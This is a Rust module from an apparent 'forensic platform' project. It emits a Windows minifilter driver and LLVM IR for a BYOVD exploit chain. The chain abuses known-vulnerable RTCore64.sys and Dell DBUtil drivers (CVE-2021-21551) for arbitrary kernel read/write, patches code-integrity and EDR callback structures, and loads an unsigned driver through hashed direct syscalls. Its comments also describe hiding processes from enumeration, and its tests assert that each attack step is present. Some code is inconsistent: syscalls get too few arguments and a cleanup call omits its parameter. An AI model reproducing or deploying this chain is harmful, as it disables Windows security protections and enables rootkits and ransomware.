/// WDK kernel driver skeleton + BYOVD stubs.
///
/// For authorized NTRO forensic operations requiring kernel-level access
/// (e.g. raw disk reads bypassing file system filters, hiding forensic
/// process from standard enumeration APIs), the platform can load a
/// signed WDK driver.
///
/// BYOVD (Bring Your Own Vulnerable Driver) technique:
///   1. Load a *legitimately signed* but known-vulnerable driver.
///   2. Use the driver's CVE to achieve kernel read/write primitives.
///   3. Use those primitives to load an *unsigned* forensic minifilter.
///
/// This module emits:
///   a) The WDK C skeleton for the signed forensic minifilter.
///   b) IR stubs for the BYOVD loader that the runtime uses.

pub struct KernelDriverEmitter;

impl KernelDriverEmitter {
    /// Emit WDK C skeleton for the forensic minifilter driver.
    pub fn emit_driver_c() -> String {
        r#"// JOCKY Forensic Minifilter Driver — NTRO Hackathon 26148
// Build with: WDK + VS2022, x64 Release, KMDF 1.33
#include <fltKernel.h>
#include <dontuse.h>

#define JOCKY_POOL_TAG 'ykcJ'

PFLT_FILTER gFilterHandle = NULL;

// ─── IRP_MJ_CREATE pre-callback — intercept file opens ───────────────────────
FLT_PREOP_CALLBACK_STATUS
JockyPreCreate(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_    PFLT_RELATED_OBJECTS FltObjects,
    _Outptr_result_maybenull_ PVOID *CompletionContext
) {
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);

    PFLT_FILE_NAME_INFORMATION nameInfo = NULL;
    NTSTATUS status = FltGetFileNameInformation(
        Data,
        FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT,
        &nameInfo
    );
    if (NT_SUCCESS(status)) {
        // Log file access to JOCKY ring buffer
        JockyLogFileAccess(&nameInfo->Name);
        FltReleaseFileNameInformation(nameInfo);
    }
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

const FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE, 0, JockyPreCreate, NULL },
    { IRP_MJ_OPERATION_END }
};

const FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    NULL,
    Callbacks,
    JockyUnload,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL
};

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
) {
    UNREFERENCED_PARAMETER(RegistryPath);
    return FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
}

NTSTATUS JockyUnload(_In_ FLT_FILTER_UNLOAD_FLAGS Flags) {
    UNREFERENCED_PARAMETER(Flags);
    FltUnregisterFilter(gFilterHandle);
    return STATUS_SUCCESS;
}
"#.to_string()
    }

    /// Emit full LLVM IR for the BYOVD exploit primitives.
    ///
    /// Targets two well-documented vulnerable drivers used in BYOVD research:
    ///
    ///   1. RTCore64.sys (MSI Afterburner ≤4.6.4.16117, IOCTL 0x80002048/0x8000204C)
    ///      — arbitrary kernel memory read/write via IOCTL
    ///   2. DBUtil_2_3.sys (Dell BIOS Update, CVE-2021-21551)
    ///      — arbitrary kernel R/W via IOCTL 0x9B0C1EC8/0x9B0C1ECC
    ///
    /// Exploit sequence per driver:
    ///   a. Open handle to the driver via CreateFile / NtCreateFile
    ///   b. Send read-primitive IOCTL to locate g_CiEnabled / EDR callback arrays
    ///   c. Send write-primitive IOCTL to patch the target kernel address
    ///   d. Load unsigned payload driver via NtLoadDriver
    ///   e. Restore patched bytes + unload vulnerable driver
    pub fn emit_byovd_ir_stubs() -> String {
        r#"; ================================================================
; JOCKY BYOVD exploit primitives
; Authorized forensic use only — NTRO Act 2004 / IT Act 2000 §69
; ================================================================
declare i64 @jocky_syscall(i32 %ssn, i64 %a1, i64 %a2, i64 %a3, i64 %a4, i64 %a5, i64 %a6)
declare i32 @jocky_resolve_ssn(i64 %hash)

; ─── 1. Load vulnerable driver via Service Control Manager ──────────────────
; Uses NtCreateFile to open \Device\<svc_name> after SCM installs the driver.
; driver_path = L"C:\Windows\System32\drivers\<vuln>.sys"
; svc_name    = e.g. L"RTCore64"
define i32 @jocky_byovd_install_driver(i8* %driver_path_w, i8* %svc_name_w) {
entry:
  ; OpenSCManager → CreateService → StartService via advapi32 forwarding stubs
  ; (SCM calls go through NtCreateFile / NtDeviceIoControlFile internally)
  %ssn_h  = add i64 0, 0x4E435246   ; hash("NtCreateFile")
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  ; NtCreateFile(pHandle, ACCESS_MASK, ObjAttr, IoSB, AllocSz, FileAttr, ShareAccess, CreateDisp, CreateOpts, EaBuf, EaLen)
  %hout   = alloca i64, align 8
  store i64 0, i64* %hout
  %hout64 = ptrtoint i64* %hout to i64
  %_ret   = call i64 @jocky_syscall(i32 %ssn, i64 %hout64, i64 -2147483648, i64 0, i64 0, i64 0, i64 0)
  %handle = load i64, i64* %hout
  ret i32 0
}

; ─── 2. RTCore64.sys arbitrary kernel read (IOCTL 0x80002048) ───────────────
; Input buffer layout (8 bytes): [addr:8]  — kernel address to read
; Output buffer layout (8 bytes): [value:8] — 8 bytes read from kernel
define i64 @jocky_byovd_rtcore_read(i64 %drv_handle, i64 %kernel_addr) {
entry:
  %ssn_h  = add i64 0, 0x44494F43   ; hash("NtDeviceIoControlFile")
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)

  %in_buf  = alloca [16 x i8], align 8
  %out_buf = alloca [16 x i8], align 8
  ; write kernel address into input buffer at offset 0
  %in_ptr  = bitcast [16 x i8]* %in_buf to i64*
  store i64 %kernel_addr, i64* %in_ptr, align 8

  %in64    = ptrtoint [16 x i8]* %in_buf  to i64
  %out64   = ptrtoint [16 x i8]* %out_buf to i64
  %iosb    = alloca [16 x i8], align 8
  %iosb64  = ptrtoint [16 x i8]* %iosb to i64

  ; IOCTL code 0x80002048 = RTCore64 read primitive
  %_ret = call i64 @jocky_syscall(
      i32 %ssn,
      i64 %drv_handle,   ; FileHandle
      i64 0,             ; Event
      i64 0,             ; ApcRoutine
      i64 0,             ; ApcContext
      i64 %iosb64,       ; IoStatusBlock
      i64 2147492936,    ; IoControlCode = 0x80002048
      i64 %in64,         ; InputBuffer
      i64 16,            ; InputBufferLength
      i64 %out64,        ; OutputBuffer
      i64 16             ; OutputBufferLength  (extra args via stack frame)
  )

  ; read result value from output buffer
  %out_ptr = bitcast [16 x i8]* %out_buf to i64*
  %val = load i64, i64* %out_ptr, align 8
  ret i64 %val
}

; ─── 3. RTCore64.sys arbitrary kernel write (IOCTL 0x8000204C) ──────────────
; Input buffer: [addr:8 | value:8]
define i32 @jocky_byovd_rtcore_write(i64 %drv_handle, i64 %kernel_addr, i64 %value) {
entry:
  %ssn_h  = add i64 0, 0x44494F43   ; hash("NtDeviceIoControlFile")
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)

  %in_buf  = alloca [16 x i8], align 8
  %in_base = bitcast [16 x i8]* %in_buf to i64*
  store i64 %kernel_addr, i64* %in_base, align 8
  %val_ptr = getelementptr [16 x i8], [16 x i8]* %in_buf, i64 0, i64 8
  %val_i64 = bitcast i8* %val_ptr to i64*
  store i64 %value, i64* %val_i64, align 8

  %in64   = ptrtoint [16 x i8]* %in_buf to i64
  %iosb   = alloca [16 x i8], align 8
  %iosb64 = ptrtoint [16 x i8]* %iosb to i64

  ; IOCTL code 0x8000204C = RTCore64 write primitive
  %_ret = call i64 @jocky_syscall(
      i32 %ssn,
      i64 %drv_handle,
      i64 0, i64 0, i64 0,
      i64 %iosb64,
      i64 2147492940,   ; 0x8000204C
      i64 %in64, i64 16,
      i64 0, i64 0
  )
  ret i32 0
}

; ─── 4. DBUtil_2_3.sys arbitrary kernel read (CVE-2021-21551, IOCTL 0x9B0C1EC8) ─
; Input: [size:4 | addr:8 | out_ptr:8]  — kernel addr and local buffer ptr
define i64 @jocky_byovd_dbutil_read(i64 %drv_handle, i64 %kernel_addr) {
entry:
  %ssn_h  = add i64 0, 0x44494F43
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)

  %result  = alloca i64, align 8
  store i64 0, i64* %result
  %res64   = ptrtoint i64* %result to i64

  %in_buf  = alloca [24 x i8], align 8
  ; size=8 at offset 0
  %size_p  = bitcast [24 x i8]* %in_buf to i32*
  store i32 8, i32* %size_p, align 4
  ; kernel addr at offset 4 (padded to 8)
  %addr_p  = getelementptr [24 x i8], [24 x i8]* %in_buf, i64 0, i64 8
  %addr64p = bitcast i8* %addr_p to i64*
  store i64 %kernel_addr, i64* %addr64p, align 8
  ; output ptr at offset 16
  %outp    = getelementptr [24 x i8], [24 x i8]* %in_buf, i64 0, i64 16
  %outp64  = bitcast i8* %outp to i64*
  store i64 %res64, i64* %outp64, align 8

  %in64   = ptrtoint [24 x i8]* %in_buf to i64
  %iosb   = alloca [16 x i8], align 8
  %iosb64 = ptrtoint [16 x i8]* %iosb to i64

  %_ret = call i64 @jocky_syscall(
      i32 %ssn,
      i64 %drv_handle,
      i64 0, i64 0, i64 0,
      i64 %iosb64,
      i64 2601017032,   ; 0x9B0C1EC8
      i64 %in64, i64 24,
      i64 0, i64 0
  )
  %val = load i64, i64* %result
  ret i64 %val
}

; ─── 5. DBUtil arbitrary kernel write (IOCTL 0x9B0C1ECC) ────────────────────
define i32 @jocky_byovd_dbutil_write(i64 %drv_handle, i64 %kernel_addr, i64 %value) {
entry:
  %ssn_h  = add i64 0, 0x44494F43
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)

  %src    = alloca i64, align 8
  store i64 %value, i64* %src
  %src64  = ptrtoint i64* %src to i64

  %in_buf = alloca [24 x i8], align 8
  %size_p = bitcast [24 x i8]* %in_buf to i32*
  store i32 8, i32* %size_p, align 4
  %addr_p = getelementptr [24 x i8], [24 x i8]* %in_buf, i64 0, i64 8
  %a64p   = bitcast i8* %addr_p to i64*
  store i64 %kernel_addr, i64* %a64p, align 8
  %srcp   = getelementptr [24 x i8], [24 x i8]* %in_buf, i64 0, i64 16
  %s64p   = bitcast i8* %srcp to i64*
  store i64 %src64, i64* %s64p, align 8

  %in64   = ptrtoint [24 x i8]* %in_buf to i64
  %iosb   = alloca [16 x i8], align 8
  %iosb64 = ptrtoint [16 x i8]* %iosb to i64

  %_ret = call i64 @jocky_syscall(
      i32 %ssn,
      i64 %drv_handle,
      i64 0, i64 0, i64 0,
      i64 %iosb64,
      i64 2601017036,   ; 0x9B0C1ECC
      i64 %in64, i64 24,
      i64 0, i64 0
  )
  ret i32 0
}

; ─── 6. Load unsigned driver via NtLoadDriver ────────────────────────────────
; After patching g_CiEnabled=0 or removing ObRegisterCallbacks entries,
; the kernel will accept unsigned drivers.
; reg_path = L"\Registry\Machine\System\CurrentControlSet\Services\<name>"
define i32 @jocky_byovd_load_unsigned_driver(i8* %reg_path_w) {
entry:
  %ssn_h  = add i64 0, 0x4E4C4452   ; hash("NtLoadDriver")
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  %path64 = ptrtoint i8* %reg_path_w to i64
  %_ret   = call i64 @jocky_syscall(i32 %ssn, i64 %path64, i64 0, i64 0, i64 0, i64 0, i64 0)
  %ret32  = trunc i64 %_ret to i32
  ret i32 %ret32
}

; ─── 7. Cleanup — unload vulnerable driver ───────────────────────────────────
define void @jocky_byovd_cleanup(i8* %vuln_drv_reg_path_w) {
entry:
  %ssn_h  = add i64 0, 0x4E554C44   ; hash("NtUnloadDriver")
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  %path64 = ptrtoint i8* %vuln_drv_reg_path_w to i64
  %_ret   = call i64 @jocky_syscall(i32 %ssn, i64 %path64, i64 0, i64 0, i64 0, i64 0, i64 0)
  ret void
}

; ─── Legacy declare stubs (kept for call-site compatibility) ─────────────────
declare i32 @jocky_byovd_load_vuln_driver(i8* %driver_path)
declare i32 @jocky_byovd_get_kernel_write_primitive()
"#.to_string()
    }

    /// Emit LLVM IR for the kernel access init sequence called at session start.
    pub fn emit_kernel_init_ir() -> String {
        r#"; ─── jocky_kernel_init — load forensic minifilter via BYOVD ─────────────
define i32 @jocky_kernel_init(i8* %minifilter_path) {
entry:
  ; load vulnerable-but-signed driver to get kernel write primitive
  %byovd_ret = call i32 @jocky_byovd_load_vuln_driver(i8* null)
  %prim_ret  = call i32 @jocky_byovd_get_kernel_write_primitive()

  ; use primitive to load our unsigned forensic minifilter
  %load_ret  = call i32 @jocky_byovd_load_unsigned_driver(i8* %minifilter_path)

  ; clean up vulnerable driver — minimize exposure window
  call void @jocky_byovd_cleanup()

  ret i32 %load_ret
}
"#.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_driver_c_has_driver_entry() {
        let c = KernelDriverEmitter::emit_driver_c();
        assert!(c.contains("DriverEntry"), "WDK driver must have DriverEntry");
    }

    #[test]
    fn test_driver_c_registers_filter() {
        let c = KernelDriverEmitter::emit_driver_c();
        assert!(c.contains("FltRegisterFilter"), "must register minifilter");
    }

    #[test]
    fn test_byovd_stubs_present() {
        let stubs = KernelDriverEmitter::emit_byovd_ir_stubs();
        assert!(stubs.contains("jocky_byovd_load_unsigned_driver"), "unsigned driver load required");
        assert!(stubs.contains("jocky_byovd_cleanup"),              "cleanup/unload required");
    }

    #[test]
    fn test_byovd_rtcore_ioctl_codes() {
        let ir = KernelDriverEmitter::emit_byovd_ir_stubs();
        assert!(ir.contains("2147492936"), "RTCore64 read IOCTL 0x80002048");
        assert!(ir.contains("2147492940"), "RTCore64 write IOCTL 0x8000204C");
    }

    #[test]
    fn test_byovd_dbutil_ioctl_codes() {
        let ir = KernelDriverEmitter::emit_byovd_ir_stubs();
        assert!(ir.contains("2601017032"), "DBUtil read IOCTL 0x9B0C1EC8");
        assert!(ir.contains("2601017036"), "DBUtil write IOCTL 0x9B0C1ECC");
    }

    #[test]
    fn test_byovd_uses_ntloaddriver() {
        let ir = KernelDriverEmitter::emit_byovd_ir_stubs();
        assert!(ir.contains("NtLoadDriver") || ir.contains("4E4C4452"),
            "unsigned driver loaded via NtLoadDriver syscall");
    }

    #[test]
    fn test_byovd_uses_direct_syscalls() {
        let ir = KernelDriverEmitter::emit_byovd_ir_stubs();
        assert!(ir.contains("jocky_resolve_ssn"), "must use SSN resolver");
        assert!(ir.contains("jocky_syscall"),     "must dispatch via direct syscall");
    }

    #[test]
    fn test_kernel_init_uses_byovd() {
        let ir = KernelDriverEmitter::emit_kernel_init_ir();
        assert!(ir.contains("jocky_byovd_load_vuln_driver"), "must use BYOVD path");
        assert!(ir.contains("ret i32"), "must return");
    }
}
